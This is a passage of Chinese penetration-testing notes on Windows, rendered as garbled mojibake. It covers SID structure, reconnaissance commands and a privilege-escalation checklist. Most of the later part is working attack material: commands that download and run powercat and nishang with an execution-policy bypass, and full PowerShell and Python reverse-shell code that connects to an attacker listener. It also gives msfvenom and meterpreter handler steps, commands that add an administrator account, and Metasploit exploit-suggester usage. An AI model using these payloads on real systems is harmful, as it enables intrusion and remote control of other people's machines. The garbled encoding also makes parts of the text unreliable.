‡è¯†ç”¨æˆ·ã€ç»„æˆ–è®¡ç®—æœºã€‚SID æ˜¯ä¸€ç§å­—ç¬¦ä¸²ï¼Œç”¨æ¥æ ‡è¯†ä¸èµ„æºè®¿é—®ç›¸å…³çš„ä¸»ä½“ S-1-5-18 (LocalSystem)\\ S-1-5-19 (LocalService)\\ S-1-5-20 (NetworkService)\\ S-1-5-32-544 (Administrators)\\ S-1-5-32-545 (Users)\\ S-1-5-32-550 (PrintOperators) æŸ¥è¯¢ SID wmic useraccount get name,sid SID è§£æ 19922 S-1-5-21-273206267-380918465-181388736-1001 Vultop S-1-5-21-1205915028-4293886087-4092552726-1001 S-1-ï¼šè¿™æ˜¯ SID çš„é€šç”¨å‰ç¼€ï¼Œè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªä¿®è®¢ç‰ˆä¸º 1 çš„ SIDã€‚ ä¿®è®¢ç‰ˆæœ¬ï¼šSID æ˜¯ä¸º Windows NT 4.0 åŠä»¥åçš„ç‰ˆæœ¬åˆ›å»ºçš„ã€‚ 5ï¼šä¿®è®¢çº§åˆ«ï¼Œè¡¨ç¤ºè¿™æ˜¯ NT 4.0 ä»¥åçš„ç‰ˆæœ¬ã€‚ 21ï¼šè¡¨ç¤ºé¢å‘ SID çš„é¢†åŸŸï¼ˆåœ¨ Active Directory ç¯å¢ƒä¸­ï¼Œé€šå¸¸æ˜¯åŸŸçš„ç›¸å¯¹æ ‡è¯†ç¬¦ï¼‰ã€‚ é¢†åŸŸä¿¡æ¯ï¼šè¯¥ SID å¯èƒ½å±äºä¸€ä¸ªå…·æœ‰ç›¸å¯¹æ ‡è¯†ç¬¦ï¼ˆRIDï¼‰ä¸º â€œ21â€ çš„åŸŸã€‚ 1205915028ï¼šé¢å‘æœºæ„çš„å®‰å…¨æ ‡è¯†ç¬¦ï¼ˆé€šå¸¸æ˜¯ä¸€ä¸ª GUIDï¼‰ã€‚ é¢å‘æœºæ„ï¼šç”±å…·æœ‰ GUID â€œ1205915028â€ çš„é¢å‘æœºæ„åˆ›å»ºã€‚ 4293886087 å’Œ 4092552726ï¼šè¡¨ç¤ºä¸é¢å‘æœºæ„ SID ç›¸å…³è”çš„å­æƒå¨å€¼ã€‚ å­æƒå¨å€¼ï¼šè¯´æ˜ SID å¦‚ä½•è¿›ä¸€æ­¥ç»†åˆ†å’Œç®¡ç†ã€‚ 1001ï¼šè¿™æ˜¯ç‰¹å®šä¸»ä½“çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¦‚ç”¨æˆ·ã€ç»„æˆ–æœåŠ¡è´¦æˆ·ã€‚ å”¯ä¸€æ ‡è¯†ç¬¦ï¼šæœ€åçš„æ•°å­—ï¼ˆå¦‚ â€œ1001â€ï¼‰æ ‡è¯†ç‰¹å®šçš„ç”¨æˆ·æˆ–æœåŠ¡è´¦æˆ·ã€‚ é’ˆå¯¹ S-1-5-21-1004336348-1177238915-682003330-512è¿›è¡Œè§£æï¼Œå¯ä»¥çŸ¥é“ SID çš„ç‰ˆæœ¬å·æ˜¯ 1\\ ä¸»æ ‡è¯†å€¼æ˜¯ 5ï¼Œä»£è¡¨ NT æƒé™\\ åŸŸç›¸å…³çš„å­æ ‡è¯†å€¼æ˜¯ 21-1004336348-1177238915-682003330\\ RID æ˜¯ 512ï¼Œä»£è¡¨ DomainAdmins 4.åŸºæœ¬å‘½ä»¤ å‘½ä»¤ æè¿° systeminfo æ‰“å°ç³»ç»Ÿä¿¡æ¯ whoami è·å–å½“å‰ç”¨æˆ·å whoami /priv åˆ—å‡ºå½“å‰å¸æˆ·æƒé™ ipconfig ç½‘ç»œé…ç½®ä¿¡æ¯ ipconfig /displaydns æ˜¾ç¤º DNS ç¼“å­˜ route print æ‰“å°è·¯ç”±è¡¨ arp -a æ‰“å° ARP è¡¨ hostname è·å–ä¸»æœºå net user åˆ—å‡ºç”¨æˆ· net localgroup åˆ—å‡ºæ‰€æœ‰ç»„ net view \\127.0.0.1 åˆ—å‡ºæ‰“å¼€åˆ°å½“å‰è®¡ç®—æœºçš„ä¼šè¯ net session åˆ—å‡ºå…¶ä»–æœºå™¨æ‰“å¼€çš„ä¼šè¯ netsh firewall show config æ˜¾ç¤ºé˜²ç«å¢™é…ç½® DRIVERQUERY åˆ—å‡ºå·²å®‰è£…çš„é©±åŠ¨ tasklist /svc åˆ—å‡ºæœåŠ¡ä»»åŠ¡ net start åˆ—å‡ºå¯åŠ¨çš„æœåŠ¡ dir /s foo åœ¨ç›®å½•ä¸­æœç´¢åŒ…å«æŒ‡å®šå­—ç¬¦çš„é¡¹ç›® sc query åˆ—å‡ºæ‰€æœ‰æœåŠ¡ sc qc ServiceName æ‰¾åˆ°æŒ‡å®šæœåŠ¡çš„è·¯å¾„ shutdown /r /t 0 ç«‹å³é‡å¯ type file.txt æ‰“å°æ–‡ä»¶å†…å®¹ icacls C:\\Example åˆ—å‡ºæƒé™ wmic qfe get Caption,Description,HotFixID,InstalledOn åˆ—å‡ºå·²å®‰è£…çš„è¡¥ä¸ (New-Object System.Net.WebClient).DownloadFile(http://host/file,C:\\LocalPath) åˆ©ç”¨ PowerShell è¿œç¨‹ä¸‹è½½æ–‡ä»¶åˆ°æœ¬åœ° accesschk.exe -qwsu Group ä¿®æ”¹å¯¹è±¡æƒé™ $ query user #æŸ¥çœ‹ç”¨æˆ·ç™»é™†æƒ…å†µ$ whoami #å½“å‰ç”¨æˆ·æƒé™$ set #ç¯å¢ƒå˜é‡$ä¸»æœºå #ä¸»æœºå$ systeminfo #æŸ¥çœ‹å½“å‰ç³»ç»Ÿç‰ˆæœ¬ä¸è¡¥ä¸ä¿¡æ¯$ ver #æŸ¥çœ‹å½“å‰æœåŠ¡å™¨æ“ä½œç³»ç»Ÿç‰ˆæœ¬$ net user #æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯$ net start #æŸ¥çœ‹å½“å‰è®¡ç®—æœºå¼€å¯æœåŠ¡åç§°$ netstat -ano #æŸ¥çœ‹ç«¯å£æƒ…å†µ$ netstat -ano|find 3389 #æŸ¥çœ‹æŒ‡å®šç«¯å£$ tasklist #æŸ¥çœ‹æ‰€æœ‰è¿›ç¨‹å ç”¨çš„ç«¯å£$ taskkil /im xxx.exe /f #å¼ºåˆ¶ç»“æŸæŒ‡å®šè¿›ç¨‹$ taskkil -PID pid # ç»“æŸæŸä¸ªpidå·çš„è¿›ç¨‹$ tasklist /svc|find TermService # æŸ¥çœ‹æœåŠ¡pidå·$ wmic os get title # æŸ¥çœ‹ç³»ç»Ÿå$ wmic Product get name,version # æŸ¥çœ‹å½“å‰å®‰è£…ç¨‹åº$ wmic qfe get Description,HotFixID,InstalledOn # æŸ¥çœ‹è¡¥ä¸ä¿¡æ¯$ wmic qfe get Description,HotFixID,InstalledOn | å¼ºåˆ¶ç»“æŸæŒ‡å®šè¿›ç¨‹$ findstr /C: KB4346084 /C: KB4509094 # å®šä½ç‰¹å®šè¡¥ä¸#æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·$ net user username(ç”¨æˆ·å) password(å¯†ç ) /add # æ·»åŠ æ™®é€šç”¨æˆ·$ net localgroup adminstrators username /add # æŠŠæ™®é€šç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†å‘˜ç”¨æˆ·ç»„#å¦‚æœè¿œç¨‹æ¡Œé¢è¿æ¥ä¸ä¸Šå¯ä»¥æ·»åŠ è¿œç¨‹æ¡Œé¢ç»„$ net localgroup Remote Desktop Users username / add é¡¹ç›®ï¼ˆItemï¼‰ å‘½ä»¤æ£€æŸ¥é¡¹ï¼ˆCommandCheckï¼‰ ç›®çš„ï¼ˆWhyï¼‰ ç³»ç»Ÿä¸è¡¥ä¸ï¼ˆSystem Patchesï¼‰ systeminfoï¼›wmic qfe get ç¡®å®šæ“ä½œç³»ç»Ÿç‰ˆæœ¬ã€å®‰è£…æ—¥æœŸåŠå·²å®‰è£…çš„çƒ­ä¿®å¤è¡¥ä¸ï¼ˆhotfixesï¼‰ã€‚ å½“å‰èº«ä»½ä¸æƒé™ï¼ˆCurrent Identity Privilegesï¼‰ whoamiï¼›whoami /privï¼›whoami /all è¯†åˆ«å½“å‰ç”¨æˆ·ä»¤ç‰Œã€æƒé™ï¼ˆå¦‚SeImpersonateã€SeDebugç­‰ï¼‰åŠç”¨æˆ·ç»„ä¿¡æ¯ã€‚ ç”¨æˆ·ä¸ç»„ï¼ˆUsers Groupsï¼‰ net userï¼›net localgroup administrators æšä¸¾æœ¬åœ°ç”¨æˆ·ã€ç®¡ç†å‘˜ç»„æˆå‘˜ã€‚ æœåŠ¡ä¸å¯åŠ¨é¡¹ï¼ˆServices Startupï¼‰ sc query state=allï¼›sc qc æœåŠ¡å æŸ¥æ‰¾æœåŠ¡ã€å¯åŠ¨æ¨¡å¼åŠäºŒè¿›åˆ¶è·¯å¾„ã€‚ è®¡åˆ’ä»»åŠ¡ï¼ˆScheduled Tasksï¼‰ schtasks /query /fo LIST /v æšä¸¾è®¡åˆ’ä»»åŠ¡åŠè¯¦ç»†ä¿¡æ¯ã€‚ æ–‡ä»¶ç³»ç»Ÿä¸ACLï¼ˆFile System ACLï¼‰ icacls C:\\Windows\\System32ï¼›icacls [æ•æ„Ÿç›®å½•] è¯†åˆ«å¯å†™å…¥çš„æ•æ„Ÿç›®å½•æˆ–ACLæƒé™é…ç½®é”™è¯¯ã€‚ æ³¨å†Œè¡¨é¡¹ï¼ˆè¯»å–ï¼‰ï¼ˆRegistry Keys (read)ï¼‰ reg query HKLM\\SYSTEM\\CurrentControlSet\\Servicesï¼›reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run å¯¼å‡ºæœåŠ¡é”®å€¼ã€è‡ªåŠ¨è¿è¡Œï¼ˆAutoRunï¼‰æ¡ç›®ç­‰ã€‚ è¿›ç¨‹ä¸é•œåƒè·¯å¾„ï¼ˆProcesses Image Pathsï¼‰ tasklist /vï¼›wmic process get name,executablepath è¯†åˆ«ç‰¹æƒè¿›ç¨‹åŠå¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€‚ ç¯å¢ƒå˜é‡ï¼ˆEnvironment Variablesï¼‰ set æ£€æŸ¥PATHã€TEMPã€PSModulePathç­‰æ˜¯å¦å­˜åœ¨å¯åŠ«æŒçš„æ¡ç›®ã€‚ äº‹ä»¶æ—¥å¿—Sysmonï¼ˆEvent Logs Sysmonï¼‰ wevtutil qe Security /q:* /f:textï¼›Get-WinEvent -LogName Microsoft-Windows-Sysmon/Operationalï¼ˆPowerShellï¼‰ æ”¶é›†è¿›ç¨‹åˆ›å»ºã€æœåŠ¡å˜æ›´ç­‰æ—¥å¿—ï¼›è‹¥å­˜åœ¨Sysmonï¼Œåˆ™æ£€æŸ¥å…¶äº‹ä»¶ã€‚ UACé˜²å¾¡è½¯ä»¶EDRçŠ¶æ€ï¼ˆUAC Defender EDR stateï¼‰ reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUAï¼ˆæ£€æŸ¥UACï¼‰ï¼›Get-MpComputerStatusï¼ˆPowerShellï¼Œæ£€æŸ¥DefenderçŠ¶æ€ï¼‰ äº†è§£é˜²å¾¡æ€åŠ¿ï¼ˆå¦‚UACæ˜¯å¦å¯ç”¨ã€DefenderEDRçŠ¶æ€ï¼‰åŠå¯ç”¨çš„ç¼“è§£æªæ–½ã€‚ 5.å¸¸ç”¨å‘½ä»¤ ç±»åˆ« å‘½ä»¤ ä¸»è¦å‚æ•° åŠŸèƒ½æè¿° æ–‡ä»¶ç®¡ç† dir /s é€’å½’æœç´¢å­ç›®å½• /b ç®€æ˜æ ¼å¼(ä»…è·¯å¾„å’Œæ–‡ä»¶å) /a:[d h /p åˆ†é¡µæ˜¾ç¤º /w å®½åˆ—è¡¨æ ¼å¼ copy /y è¦†ç›–æ—¶ä¸æç¤º /v éªŒè¯æ–‡ä»¶å†™å…¥æ­£ç¡®æ€§ xcopy /e å¤åˆ¶ç›®å½•å’Œå­ç›®å½•(å«ç©ºç›®å½•) /h å¤åˆ¶éšè—å’Œç³»ç»Ÿæ–‡ä»¶ robocopy /mir é•œåƒç›®å½•æ ‘(åŒæ­¥åˆ é™¤) /mt:n å¤šçº¿ç¨‹å¤åˆ¶(nçº¿ç¨‹æ•°) del /f å¼ºåˆ¶åˆ é™¤åªè¯»æ–‡ä»¶ /s ä»æ‰€æœ‰å­ç›®å½•åˆ é™¤æŒ‡å®šæ–‡ä»¶ è¿›ç¨‹ç®¡ç† tasklist /v è¯¦ç»†æ¨¡å¼(æ˜¾ç¤ºæ›´å¤šä¿¡æ¯) /svc æ˜¾ç¤ºè¿›ç¨‹åŒ…å«çš„æœåŠ¡ /m [module] æ˜¾ç¤ºåŠ è½½çš„DLLæ¨¡å— /fi filter è¿‡æ»¤å™¨æ¡ä»¶ taskkill /im name æŒ‰æ˜ åƒåç§°ç»“æŸè¿›ç¨‹ /pid id æŒ‰è¿›ç¨‹IDç»“æŸè¿›ç¨‹ /f å¼ºåˆ¶ç»ˆæ­¢è¿›ç¨‹ /t ç»ˆæ­¢å­è¿›ç¨‹ ç½‘ç»œè¯Šæ–­ ping -t æŒç»­pingç›´åˆ°æ‰‹åŠ¨åœæ­¢ -n count æŒ‡å®šå‘é€è¯·æ±‚æ¬¡æ•° -l size size å‘é€ç¼“å†²åŒºå¤§å° -w timeout è¶…æ—¶æ—¶é—´(æ¯«ç§’) ipconfig all æ˜¾ç¤ºå®Œæ•´é…ç½®ä¿¡æ¯ release é‡Šæ”¾IPåœ°å€ç§Ÿçº¦ renew ç»­è®¢IPåœ°å€ç§Ÿçº¦ flushdns æ¸…é™¤DNSè§£æç¼“å­˜ displaydns æ˜¾ç¤ºDNSè§£æç¼“å­˜å†…å®¹ netstat -a æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£ -n ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å· -b æ˜¾ç¤ºåˆ›å»ºè¿æ¥çš„åº”ç”¨ç¨‹åº -o æ˜¾ç¤ºæ‹¥æœ‰çš„è¿›ç¨‹ID tracert -d ä¸å°†åœ°å€è§£ææˆä¸»æœºå -h max_hops æœç´¢ç›®æ ‡çš„æœ€å¤§è·ƒç‚¹æ•° ç£ç›˜ç®¡ç† chkdsk f ä¿®å¤ç£ç›˜ä¸Šçš„é”™è¯¯ r å®šä½åæ‰‡åŒºå¹¶æ¢å¤å¯è¯»ä¿¡æ¯ x å¿…è¦æ—¶å¼ºåˆ¶å¸è½½å· format fs:type æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿ(FAT32/NTFS) q å¿«é€Ÿæ ¼å¼åŒ– a:size åˆ†é…å•å…ƒå¤§å° ç³»ç»ŸæœåŠ¡ sc query æŸ¥è¯¢æœåŠ¡çŠ¶æ€ start å¯åŠ¨æœåŠ¡ stop åœæ­¢æœåŠ¡ create åˆ›å»ºæœåŠ¡ ç³»ç»Ÿä¿¡æ¯ systeminfo fo format æŒ‡å®šè¾“å‡ºæ ¼å¼(table/list/csv) sfc scannow ç«‹å³æ‰«ææ‰€æœ‰å—ä¿æŠ¤çš„ç³»ç»Ÿæ–‡ä»¶ verifyonly æ‰«æä½†ä¸ä¿®å¤ FTPä¼ è¾“ ftp -i å…³é—­äº¤äº’æ¨¡å¼ -s:file æ‰§è¡ŒæŒ‡å®šæ–‡ä»¶ä¸­çš„ftpå‘½ä»¤ -v ç¦æ­¢æ˜¾ç¤ºè¿œç¨‹æœåŠ¡å™¨å“åº” æ³¨å†Œè¡¨ reg query æŸ¥è¯¢æ³¨å†Œè¡¨é”®å€¼ add æ·»åŠ æ–°çš„æ³¨å†Œè¡¨é¡¹ delete åˆ é™¤æ³¨å†Œè¡¨é¡¹ ç”¨æˆ·è´¦æˆ· net user username add æ·»åŠ ç”¨æˆ·è´¦æˆ· username delete åˆ é™¤ç”¨æˆ·è´¦æˆ· username password æ›´æ”¹ç”¨æˆ·å¯†ç  è®¡åˆ’ä»»åŠ¡ schtasks create åˆ›å»ºæ–°è®¡åˆ’ä»»åŠ¡ delete åˆ é™¤è®¡åˆ’ä»»åŠ¡ query` æ˜¾ç¤ºæ‰€æœ‰è®¡åˆ’ä»»åŠ¡ Windowsåå¼¹shell Win 192.168.129.161 KaLi 192.168.129.152powercat kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command â€œ$content Invoke-RestMethod â€˜https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1; Invoke-Expression $content; powercat -c 192.168.129.152 -p 5555 -e cmdâ€ è§£é‡Šï¼š powershellè¿™æ˜¯è°ƒç”¨ PowerShell çš„å‘½ä»¤ã€‚åœ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ï¼ˆcmdï¼‰ä¸­ï¼Œä½ å¯ä»¥é€šè¿‡ powershell å‘½ä»¤å¯åŠ¨ PowerShell ç¯å¢ƒã€‚ -ExecutionPolicy Bypassè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„å‚æ•°ï¼Œç”¨äºç»•è¿‡ PowerShell çš„æ‰§è¡Œç­–ç•¥é™åˆ¶ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒPowerShell ä¼šé™åˆ¶è¿è¡Œæœªç­¾åçš„è„šæœ¬ï¼Œä»¥é˜²æ­¢æ¶æ„è„šæœ¬çš„æ‰§è¡Œã€‚-ExecutionPolicy Bypass é€‰é¡¹å…è®¸ä½ ä¸´æ—¶ç»•è¿‡è¿™äº›é™åˆ¶ï¼Œåªåœ¨å½“å‰ä¼šè¯ä¸­è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ -Commandè¿™ä¸ªå‚æ•°ç”¨äºæŒ‡å®šè¦æ‰§è¡Œçš„ PowerShell å‘½ä»¤ã€‚ä½ å¯ä»¥å°†å¤šä¸ªå‘½ä»¤æ”¾åœ¨ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ï¼Œç”¨åˆ†å· ; åˆ†éš”ã€‚è¿™äº›å‘½ä»¤å°†åœ¨åŒä¸€ä¸ª PowerShell ä¼šè¯ä¸­ä¾æ¬¡æ‰§è¡Œã€‚ $ content Invoke-RestMethod â€˜https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 â€˜$contentï¼šè¿™æ˜¯ä¸€ä¸ªå˜é‡ï¼Œç”¨äºå­˜å‚¨ä»ç½‘ç»œä¸‹è½½çš„å†…å®¹ã€‚Invoke-RestMethodï¼šè¿™æ˜¯ä¸€ä¸ª PowerShell å‘½ä»¤ï¼Œç”¨äºä»æŒ‡å®šçš„ URL ä¸‹è½½å†…å®¹ã€‚å®ƒä¼šè¿”å›ä¸‹è½½çš„å†…å®¹ï¼Œè€Œä¸æ˜¯ä¿å­˜åˆ°æ–‡ä»¶ã€‚â€˜https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1 â€˜ï¼šè¿™æ˜¯ powercat.ps1 è„šæœ¬çš„ GitHub åŸå§‹é“¾æ¥ã€‚Invoke-RestMethod ä¼šä»è¿™ä¸ª URL ä¸‹è½½è„šæœ¬å†…å®¹ã€‚ Invoke-Expression $ contentInvoke-Expressionï¼šè¿™æ˜¯ä¸€ä¸ª PowerShell å‘½ä»¤ï¼Œç”¨äºæ‰§è¡Œå­—ç¬¦ä¸²ä¸­çš„ PowerShell å‘½ä»¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå®ƒä¼šæ‰§è¡Œä» GitHub ä¸‹è½½çš„ powercat.ps1 è„šæœ¬å†…å®¹ã€‚$contentï¼šè¿™æ˜¯ä¹‹å‰ä¸‹è½½çš„è„šæœ¬å†…å®¹ã€‚Invoke-Expression ä¼šå°†è¿™äº›å†…å®¹ä½œä¸º PowerShell ä»¤æ‰§è¡Œã€‚ powercat -c 192.168.129.152 -p 5555 -e cmdpowercatï¼šè¿™æ˜¯ powercat.ps1 è„šæœ¬ä¸­çš„ä¸€ä¸ªå‘½ä»¤ï¼Œç”¨äºå»ºç«‹ç½‘ç»œè¿æ¥ã€‚-c 192.168.129.152ï¼šæŒ‡å®šè¦è¿æ¥çš„ç›®æ ‡ IP åœ°å€ã€‚-p 5555ï¼šæŒ‡å®šè¦è¿æ¥çš„ç›®æ ‡ç«¯å£å·ã€‚-e cmdï¼šæŒ‡å®šåœ¨å»ºç«‹è¿æ¥åæ‰§è¡Œçš„å‘½ä»¤ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œcmd è¡¨ç¤ºå¯åŠ¨ Windows çš„å‘½ä»¤æç¤ºç¬¦ï¼ˆcmd.exeï¼‰ã€‚ nishang kali nc -lvp 5555 windows powershell -ExecutionPolicy Bypass -Command â€œIEX (New-Object Net.WebClient).DownloadString(â€˜https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1);;) Invoke-PowerShellTcp -Reverse -IPAddress 192.168.129.152 -Port 5555â€ è§£é‡Š è‡ªå®šä¹‰powershellå‡½æ•°åå¼¹shell kali nc -lvp 5555 win powershellç‰ˆæœ¬ powershell -nop -c â€œ$client New-Object Net.Sockets.TCPClient(â€˜192.168.129.152â€™,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (iex $data 21 | Out-String ); $sendback2 $sendback + â€˜PS â€˜ + (pwd).Path + â€˜ â€˜;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()â€ powershell -nop -c: powershell: è°ƒç”¨ PowerShellã€‚ -nop: ç®€å†™ä¸º -NoProfileï¼Œè¡¨ç¤ºä¸åŠ è½½ç”¨æˆ·é…ç½®æ–‡ä»¶ã€‚è¿™å¯ä»¥åŠ å¿«å¯åŠ¨é€Ÿåº¦ï¼Œå¹¶é¿å…é…ç½®æ–‡ä»¶ä¸­çš„è®¾ç½®å½±å“è„šæœ¬è¿è¡Œã€‚ -c: ç®€å†™ä¸º -Commandï¼Œè¡¨ç¤ºæ‰§è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚ $client = New-Object Net.Sockets.TCPClient(192.168.129.152,5555): åˆ›å»ºä¸€ä¸ª TCPClient å¯¹è±¡ï¼Œç”¨äºå»ºç«‹ TCP è¿æ¥ã€‚ 192.168.129.152: ç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ã€‚ 5555: ç›®æ ‡æœåŠ¡å™¨çš„ç«¯å£å·ã€‚ $stream = $client.GetStream(): è·å– TCPClient çš„ç½‘ç»œæµï¼ˆNetworkStreamï¼‰ï¼Œç”¨äºè¯»å–å’Œå†™å…¥æ•°æ®ã€‚ [byte[]]$bytes = 0..65535|%{0}: åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 65536 çš„å­—èŠ‚æ•°ç»„ï¼Œç”¨äºå­˜å‚¨ä»ç½‘ç»œæµä¸­è¯»å–çš„æ•°æ®ã€‚ 0..65535: ç”Ÿæˆä¸€ä¸ªä» 0 åˆ° 65535 çš„æ•°å­—åºåˆ—ã€‚ |%{0}: å¯¹æ¯ä¸ªæ•°å­—ç”Ÿæˆä¸€ä¸ªå€¼ä¸º 0 çš„å­—èŠ‚ã€‚ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0): ä»ç½‘ç»œæµä¸­è¯»å–æ•°æ®ï¼Œç›´åˆ°æ²¡æœ‰æ›´å¤šæ•°æ®å¯è¯»ã€‚ $stream.Read($bytes, 0, $bytes.Length): ä»ç½‘ç»œæµä¸­è¯»å–æ•°æ®åˆ° $bytes æ•°ç»„ä¸­ï¼Œè¿”å›è¯»å–çš„å­—èŠ‚æ•°ã€‚ -ne 0: æ£€æŸ¥æ˜¯å¦è¯»å–åˆ°æ•°æ®ï¼ˆå³è¿”å›å€¼ä¸ä¸º 0ï¼‰ã€‚ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i): å°†è¯»å–çš„å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ System.Text.ASCIIEncoding: ä½¿ç”¨ ASCII ç¼–ç å°†å­—èŠ‚è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ $i: è¯»å–çš„å­—èŠ‚æ•°ã€‚ $sendback = (iex $data 21 | Out-String ): æ‰§è¡Œä»ç½‘ç»œæµä¸­è¯»å–çš„å‘½ä»¤ï¼Œå¹¶æ•è·è¾“å‡ºã€‚ iex $data: ä½¿ç”¨ Invoke-Expressionï¼ˆiexï¼‰æ‰§è¡Œ $data ä¸­çš„å‘½ä»¤ã€‚ 21: å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºã€‚ | Out-String: å°†è¾“å‡ºè½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚ $sendback2 = $sendback + PS + (pwd).Path + : æ„é€ è¿”å›çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬å‘½ä»¤çš„è¾“å‡ºå’Œå½“å‰è·¯å¾„ã€‚ $sendback: å‘½ä»¤çš„è¾“å‡ºã€‚ PS + (pwd).Path + : å½“å‰è·¯å¾„æç¤ºç¬¦ã€‚ $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2): å°†è¿”å›çš„å­—ç¬¦ä¸²è½¬æ¢ä¸ºå­—èŠ‚æ•°ç»„ã€‚ $stream.Write($sendbyte,0,$sendbyte.Length): å°†è¿”å›çš„å­—èŠ‚å†™å›ç½‘ç»œæµã€‚ $stream.Flush(): åˆ·æ–°ç½‘ç»œæµï¼Œç¡®ä¿æ‰€æœ‰æ•°æ®éƒ½å·²å‘é€ã€‚ $client.Close(): å…³é—­ TCP å®¢æˆ·ç«¯ã€‚ cmdç‰ˆæœ¬ powershell -nop -c â€œ$client New-Object Net.Sockets.TCPClient(â€˜192.168.129.152â€™,5555);$stream $client.GetStream(); [byte[]]$bytes 0..65535|%{0};while(($i $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback (cmd c $data 21 | Out-String ); $sendback2 $sendback + â€˜CMD â€˜ + (pwd).Path + â€˜ â€˜;$sendbyte ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()â€ MSFåå¼¹ msfvenom -p windowsmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exeï¼ˆmsf æœ¬åœ°IPï¼‰ msf6 use exploit/multi/handler[*] Using configured payload generic/shell_reverse_tcpmsf6 exploit(multi/handler) set payload windows/meterpreter/reverse_tcppayload = windows/meterpreter/reverse_tcp(show options)msf6 exploit(multi/handler) set lhost 192.168.129.152lhost = 192.168.183.142msf6 exploit(multi/handler) set lport 5555lport = 4444msf6 exploit(multi/handler) exploit[*] Started reverse TCP handler on 192.168.129.152:5555 åˆ›å»ºmeterpreterä¼šè¯å execute -H -i -f cmd.exe pythonåå¼¹shell kali nc -lvp 5555 win # -*- coding:utf-8 -*-import osimport selectimport socketimport sysimport subprocessdef ReserveConnect(addr, port): åå¼¹è¿æ¥shell try: shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM) shell.connect((addr,port)) except Exception as reason: print ([-] Failed to Create Socket : %s%reason) exit(0) rlist = [shell] wlist = [] elist = [shell] while True: shell.send(cmd:.encode()) rs,ws,es = select.select(rlist,wlist,wlist) for sockfd in rs: if sockfd == shell: command = shell.recv(1024) if command == exit: shell.close() break result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate() shell.sendall(result.decode(GB2312).encode(UTF-8))# ä¸»å‡½æ•°è¿è¡Œdef run(): if len(sys.argv)3: print(Usage: python reverse.py [IP] [PORT]) else: url = sys.argv[1] port = int(sys.argv[2]) ReserveConnect(url,port)if __name__ == __main__: run() - æ‰§è¡Œpython reverse_win.py 127.0.0.1 5555 Windows å†…æ ¸æº¢å‡ºæ¼æ´ä¸€ï¼šæ‰‹å·¥ systeminfo python wes.py sys.txt https://github.com/bitsadmin/wesng æŸ¥æ‰¾å†…æ ¸ææƒexp https://github.com/k8gege/Ladon \\ https://github.com/Ascotbe/KernelHub \\ https://github.com/nomi-sec/PoC-in-GitHub \\ https://github.com/offensive-security/exploitdb \\ http://cve.mitre.org/data/refs/refmap/source-MS.html äºŒ:msfè‡ªåŠ¨(åå¼¹shellå) postwindowsgatherenum_patches(åŠè‡ªåŠ¨ï¼Œè¿˜å¾—è‡ªå·±æ‰¾,æ‰¾å‡ºç³»ç»Ÿä¸­ç¼ºå°‘çš„è¡¥ä¸) bg use postwindowsgatherenum_patches set session 1 run postmultireconlocal_exploit_suggester(å…¨è‡ªåŠ¨) bg use postmultireconlocal_exploit_suggester. set session 1 run æ‰¾åˆ°ç»¿è‰²çš„ï¼Œå¯ç”¨çš„,ä¸€ä¸ªä¸€ä¸ªè¯• ç”¨ç¬¬ä¸€ä¸ªè¯•è¯• use exploitwindowslocalalways_install_elevated set session 1 æ¢ä¸€ä¸ªä¸ä¸€æ ·çš„ç«¯å£ï¼Œç„¶åï¼Œå¦å¤–æ‰“å¼€ä¸€ä¸ªmsf,ç›‘å¬è¿™ä¸ªç«¯å£ 